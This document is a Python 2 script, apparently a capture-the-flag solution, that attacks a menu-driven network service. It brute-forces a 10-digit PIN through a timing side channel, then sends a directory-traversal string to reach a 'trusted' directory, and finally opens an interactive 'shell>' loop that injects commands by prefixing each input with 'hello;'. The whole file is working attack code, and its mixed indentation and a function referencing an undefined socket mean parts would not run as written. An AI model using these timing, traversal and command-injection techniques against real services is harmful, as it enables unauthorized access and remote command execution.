import os
import sys
import socket
import time

arg_ip = sys.argv[1]
arg_port = sys.argv[2]

# nc 127.0.0.1 12345

def recv_timer(s):
    data = s.recv(1024)
    return_tuple = ((time.time(), data))
    return return_tuple

def get_nine(data):
    if data != 'Type \'y\' to do option 9':
        s.sendall(('n'))
    else:
        s.sendall(('y'))

def netcat(host, port, info):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('socket declared')
    s.connect((host, int(port)))
    print('connected')
   # info = 'y'
    pin = ['0','0','0','0','0','0','0','0','0','0']
    counter = 0
    while counter < 10:
        isnine = False
        print(pin)
        while isnine == False:
            data = s.recv(1024)
           # print(data)
            if 'option 9' not in data:
                s.sendall(('n'))
            else:
                s.sendall(('y'))
                var = s.recv(1024)
                s.sendall(("".join(pin)))
                isnine = True
        data = s.recv(1024)
	if 'Verifying....' in data:
	    pre_call_time = time.time()
	    post_call_time, data = recv_timer(s)
	    time1 = post_call_time - pre_call_time
	    print(time1)
            if time1 > ((counter+1)*.2):
                counter += 1
            else:
                pin[counter] = int(pin[counter]) + 1
                pin[counter] = str(pin[counter])
        if not data:
            break
        print(repr(data))
    while True:
        data = s.recv(1024)
        if 'option 7' not in data:
            s.sendall(('n'))
        else:
            s.sendall(('y'))
            break
    data = s.recv(1024)
    print(data)
    s.sendall(('../../../../../../../../../../../../../trusted'))
    # should recv "changed directories" or someshit
    data = s.recv(1024)
    print(data)
    while True:
            data = s.recv(1024)
            if 'option 3' not in data:
                s.sendall(('n'))
            else:
                s.sendall(('y'))
                data = s.recv(1024)
                print(data)
                break
    while True:
        #s.sendall(('hello; ls'))
        tosend = raw_input('shell> ')
        s.sendall(('hello;'+tosend))
        data = s.recv(1024)
        print(data)
    # get option THREE
        while True:
            data = s.recv(1024)
            if 'option 3' not in data:
                s.sendall(('n'))
            else:
                s.sendall(('y'))
                data = s.recv(1024)
                print(data)
                break

    s.shutdown(socket.SHUT_WR)

netcat(arg_ip, arg_port, 'y')
